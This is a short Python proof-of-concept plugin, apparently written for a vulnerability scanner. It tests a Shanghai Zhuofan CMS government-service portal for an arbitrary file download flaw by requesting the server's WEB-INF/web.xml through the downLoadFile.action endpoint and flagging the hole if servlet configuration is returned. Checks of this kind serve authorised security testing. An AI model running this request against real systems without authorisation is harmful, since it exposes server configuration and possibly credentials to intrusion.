#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:上海卓繁cms政府服务中心存在通用型任意文件下载漏洞
#Refer:http://www.wooyun.org/bugs/wooyun-2015-54074

def assign(service,arg):
    if service=="zhuofansoftsh":
        return True,arg


def  audit(arg):
    url=arg+'index/downLoadFile.action?fileName=web.xml&filePath=WEB-INF/web.xml'
    code,head,res,errcode,_=curl.curl2(url)
    if code==200 and "<servlet-mapping>" in res:
        security_hole(url)



        return arg
if __name__== '__main__':
    from dummy import *
